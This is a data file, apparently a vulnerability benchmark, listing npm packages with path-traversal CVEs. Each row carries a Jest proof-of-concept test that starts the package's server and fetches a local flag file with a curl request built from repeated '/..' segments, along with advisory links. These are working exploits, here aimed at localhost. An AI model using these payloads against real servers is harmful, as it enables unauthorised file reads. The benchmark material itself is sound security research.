test(""Path Traversal in susu-sum"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/susu-sum/node.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,node.js:5:8,https://security.snyk.io/vuln/npm:susu-sum:20170617; https://github.com/advisories/GHSA-w7jg-972m-rphv
path-traversal,CVE-2017-16213,mfrserver,1.0.0,,path-traversal/mfrserver_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in mfrserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/mfrserver/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:6:8,https://security.snyk.io/vuln/npm:mfrserver:20170505; https://github.com/advisories/GHSA-p2r2-h92r-w2mg
path-traversal,,serveryyl,1.1.0,,path-traversal/serveryyl_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serveryyl"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serveryyl/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:6:8,https://security.snyk.io/vuln/npm:serveryyl:20180306; 
path-traversal,CVE-2017-16211,lessindex,1.0.0,,path-traversal/lessindex_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in lessindex"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/lessindex/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:5:8,https://security.snyk.io/vuln/npm:lessindex:20170425; https://github.com/advisories/GHSA-frcq-4ffq-v4mw
path-traversal,,node-staticserver,1.0.3,,path-traversal/node-staticserver_1.0.3,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in node-staticserver"", (done) => {
  expect.assertions(1);
  const pkg = require(""node-staticserver"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8983/tcp"", () => {});
  } catch (e) {}
  let app = pkg();
  app.listen(8983);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8983${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,lib/server.js:183:25,https://security.snyk.io/vuln/npm:node-staticserver:20180226; 
path-traversal,,webrepl,0.4.7,,path-traversal/webrepl_0.4.7,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in webrepl"", (done) => {
  expect.assertions(1);
  const pkg = require(""webrepl"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8974/tcp"", () => {});
  } catch (e) {}
  pkg.start(8974);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8974${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,webrepl.js:177:12,https://security.snyk.io/vuln/npm:webrepl:20180315; 
path-traversal,CVE-2017-16029,hostr,2.0.0,2.3.6,path-traversal/hostr_2.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 3000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in hostr"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 3000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/hostr/bin/hostr"";
  exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:3000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",https://github.com/henrytseng/hostr/commit/789a00047459fd80b6f0a9701a1378a47fb73ba8,lib/routes/static.js:56:27,https://security.snyk.io/vuln/npm:hostr:20161211; https://github.com/advisories/GHSA-xqqr-p362-6rmc
path-traversal,,srverqq,1.0.0,,path-traversal/srverqq_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in srverqq"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/srverqq/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:32:8,https://security.snyk.io/vuln/npm:srverqq:20170730; 
path-traversal,,node-http-server,8.1.2,,path-traversal/node-http-server_8.1.2,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in node-http-server"", (done) => {
  expect.assertions(1);
  const pkg = require(""node-http-server"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8986/tcp"", () => {});
  } catch (e) {}
  pkg.deploy({
    port: 8986,
    root: __dirname,
  });
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8986${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,server/Server.js:494:8,https://security.snyk.io/vuln/npm:node-http-server:20180226; 
path-traversal,,myserve111,1.1.2,,path-traversal/myserve111_1.1.2,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 9999/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in myserve111"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9999/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/myserve111/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9999${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:5:8,https://security.snyk.io/vuln/npm:myserve111:20180306; 
path-traversal,,wenluhong11,1.0.0,,path-traversal/wenluhong11_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in wenluhong11"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/wenluhong11/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:5:8,https://security.snyk.io/vuln/npm:wenluhong11:20180226; 
path-traversal,,canvas-designer,1.2.1,,path-traversal/canvas-designer_1.2.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 9001/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in canvas-designer"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9001/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/canvas-designer/server.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9001${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,server.js:36:8,https://security.snyk.io/vuln/npm:canvas-designer:20180226; 
path-traversal,,caihong,1.0.0,,path-traversal/caihong_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in caihong"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/caihong/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    done();
  });
});
",,index.js:5:8,https://security.snyk.io/vuln/npm:caihong:20180226; 
path-traversal,,der-server,0.0.9,,path-traversal/der-server_0.0.9,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in der-server"", (done) => {
  expect.assertions(1);
  var pkg = require(""der-server"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8887/tcp"", () => {});
  } catch (e) {}
  pkg.start(__dirname, ""../flag.html"", 8887);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8887${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,der-server.js:52:12,https://security.snyk.io/vuln/npm:der-server:20180226; 
path-traversal,,zs123,1.0.0,,path-traversal/zs123_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in zs123"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/zs123/node.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,node.js:13:8,https://security.snyk.io/vuln/npm:zs123:20180315; 
path-traversal,,sabu,1.0.6,,path-traversal/sabu_1.0.6,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in sabu"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/sabu/bin/sabu"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,utils.js:52:12,https://security.snyk.io/vuln/npm:sabu:20180226; 
path-traversal,,wuzhuang,1.0.0,,path-traversal/wuzhuang_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in wuzhuang"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/wuzhuang/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:12:8,https://security.snyk.io/vuln/npm:wuzhuang:20180226; 
path-traversal,,serverlyj333,1.1.0,,path-traversal/serverlyj333_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serverlyj333"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serverlyj333/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  let end_serv = ""fuser -k 8888/tcp"";
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    exec(end_serv, (error, stdout) => {
      done();
    });
  });
});
",,index.js:9:8,https://security.snyk.io/vuln/npm:serverlyj333:20180315; 
path-traversal,,node-cxc,1.0.0,,path-traversal/node-cxc_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 80/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in node-cxc"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 80/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/node-cxc/app.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:80${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,app.js:24:8,https://security.snyk.io/vuln/npm:node-cxc:20180226; 
path-traversal,CVE-2017-16215,sgqserve,1.0.0,,path-traversal/sgqserve_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in sgqserve"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/sgqserve/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    done();
  });
});
",,index.js:22:8,https://security.snyk.io/vuln/npm:sgqserve:20170518; https://github.com/advisories/GHSA-m8pw-hgvj-cwcm
path-traversal,,zxyserver,1.0.0,,path-traversal/zxyserver_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in zxyserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/zxyserver/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    done();
  });
});
",,index.js:10:9,https://security.snyk.io/vuln/npm:zxyserver:20180306; 
path-traversal,,simple-mock-server,0.2.1,,path-traversal/simple-mock-server_0.2.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in simple-mock-server"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/simple-mock-server/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,lib/simple-mock-server.js:62:31,https://security.snyk.io/vuln/npm:simple-mock-server:20180226; 
path-traversal,CVE-2017-16178,intsol-package,1.0.0,,path-traversal/intsol-package_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 9000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in intsol-package"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/intsol-package/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:35:41,https://security.snyk.io/vuln/npm:intsol-package:20170511; https://github.com/advisories/GHSA-23wc-v4mf-x7v4
path-traversal,,sleep,^6.3.0,,path-traversal/aso-server_0.4.3,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in aso-server"", (done) => {
  expect.assertions(1);
  var pkg = require('aso-server')
  const fs = require(""fs"");
  const { sleep } = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 3000/tcp"", () => {});
  } catch (e) {}
  let server = pkg
     .onError(e => console.log(e))
     .onStop(() => {})
     .start('localhost', 3000, srv => {});
  sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:3000/f/${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});",,,https://security.snyk.io/vuln/npm:aso-server:20180226; 
path-traversal,CVE-2017-16162,22lixian,1.0.0,,path-traversal/22lixian_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in 22lixian"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/22lixian/demo.js"";
  exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,demo.js:6:8,https://security.snyk.io/vuln/npm:22lixian:20170511; https://github.com/advisories/GHSA-rrfc-g2gh-xvjm
path-traversal,CVE-2017-16217,fbr-client,1.0.3,,path-traversal/fbr-client_1.0.3,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 9001/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in fbr-client"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9001/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/fbr-client/server.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9001${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,server.js:53:12,https://security.snyk.io/vuln/npm:fbr-client:20170510; https://github.com/advisories/GHSA-qmhf-qg6f-pc4v
path-traversal,,serverzyqzyq,1.1.0,,path-traversal/serverzyqzyq_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serverzyqzyq"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serverzyqzyq/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:5:8,https://security.snyk.io/vuln/npm:serverzyqzyq:20180315; 
path-traversal,CVE-2020-7683,rollup-plugin-server,0.7.0,,path-traversal/rollup-plugin-server_0.7.0,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in rollup-plugin-server"", (done) => {
  expect.assertions(1);
  const server = require(""rollup-plugin-server"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9000/tcp"", () => {});
  } catch (e) {}
  server({
    host: ""localhost"",
    port: 9000,
  });
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,dist/index.cjs.js:111:6,https://security.snyk.io/vuln/SNYK-JS-ROLLUPPLUGINSERVER-590123; https://github.com/advisories/GHSA-34gh-3cwv-wvp2
path-traversal,CVE-2020-7687,fast-http,0.1.3,,path-traversal/fast-http_0.1.3,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in fast-http"", (done) => {
  expect.assertions(1);
  const Server = require(""fast-http"");
  const fs = require(""fs"");
  const { exec, execSync } = require(""child_process"");
